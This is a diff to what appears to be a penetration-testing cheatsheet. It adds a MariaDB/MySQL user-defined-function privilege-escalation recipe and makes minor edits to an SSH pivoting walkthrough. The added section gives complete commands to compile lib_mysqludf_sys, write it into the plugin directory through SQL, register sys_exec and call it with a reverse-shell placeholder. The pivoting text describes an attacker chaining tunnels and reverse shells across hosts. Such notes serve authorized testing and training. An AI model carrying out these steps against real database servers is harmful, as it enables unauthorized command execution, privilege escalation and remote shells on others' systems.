@@ -1354,6 +1354,33 @@ $ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 
 
 
+### UDF PrivEsc
+
+* [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)
+* [https://github.com/mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
+
+Install dependencies and compile `.so` library:
+
+```
+$ sudo apt install libmariadbclient-dev -y
+$ git clone https://github.com/mysqludf/lib_mysqludf_sys && cd lib_mysqludf_sys
+$ gcc -m64 -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
+```
+
+Load library and call user-defined `sys_exec` function:
+
+```
+MariaDB> show variables like '%plugin%';  # get lib path
+MariaDB> use mysql;
+MariaDB> create table pwn(line blob);
+MariaDB> insert into pwn values(load_file('/tmp/lib_mysqludf_sys.so'));
+MariaDB> select * from pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
+MariaDB> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+MariaDB> select sys_exec("<REVERSE_SHELL>");
+```
+
+
+
 
 ## Oracle
 
@@ -4958,7 +4985,7 @@ A cheatsheet for SSH Local/Remote Forwarding command syntax:
 * `-L 1111:127.0.0.1:2222`: the traffic is forwarded *from SSH client via SSH server*, so `1111` is listening on *client-side* and traffic is sent to `2222` on *server-side*.
 * `-R 2222:127.0.0.1:1111`: the traffic is forwarded *from SSH server via SSH client*, so `2222` is listening on *server-side* and traffic is sent to `1111` on *client-side*.
 
-Consider the following example. An attacker has root privileges on Pivot1. He creates the first SSH tunnel (remote port forwarding) to interact with a vulnerable web server on Pivot2. Then he exploits the vulnerability on Pivot2 and triggers it to connect back to Attacker via a reverse-shell (firewall is active, so he needs to pivot through port 443, which is allowed). After that the attacker performs PE on Pivot2 and gets root. Then he creates another tunnel (local port forwarding) over the first one to SSH into Pivot2 from Attacker. Finally, he forwards port 80 over two existing hops to pwn a vulnerable web server on Victim.
+Consider the following example. An attacker has root privileges on Pivot1. He creates the first SSH tunnel (remote port forwarding) to interact with a vulnerable web server on Pivot2. Then he exploits the vulnerability on Pivot2 and triggers it to connect back to Attacker via a reverse-shell (firewall is active, so he needs to pivot through port 443, which is allowed). After that the attacker performs PE on Pivot2 and gets root. Then he creates another tunnel (local port forwarding) over the first one to SSH into Pivot2 from Attacker. Finally, he forwards port 80 over two existing hops to reach another vulnerable web server on Victim.
 
 ```
   Attacker (10.10.13.37)                                                    Pivot1 (10.1.1.1)                                  Pivot2 (10.2.2.2)                   Victim (10.3.3.3)
@@ -5005,8 +5032,8 @@ Consider the following example. An attacker has root privileges on Pivot1. He cr
 
 Notes:
 
-* `1.` For SSH server to listen at `0.0.0.0` instead of `127.0.0.1`, the `GatewayPorts yes` must be set in `/etc/ssh/sshd_config`.
-* `1.` With SSH (or Chisel, for example) **server** running on the Attacker the same can be achieved by doing **local** port forwarding instead of **remote**.
+* `1` For SSH server to listen at `0.0.0.0` instead of `127.0.0.1`, the `GatewayPorts yes` must be set in `/etc/ssh/sshd_config`.
+* `1` With SSH (or Chisel, for example) **server** running on the Attacker the same can be achieved by doing **local** port forwarding instead of **remote**.
 
 ```
 snovvcrash@attacker:~$ ./chisel server -p 8000
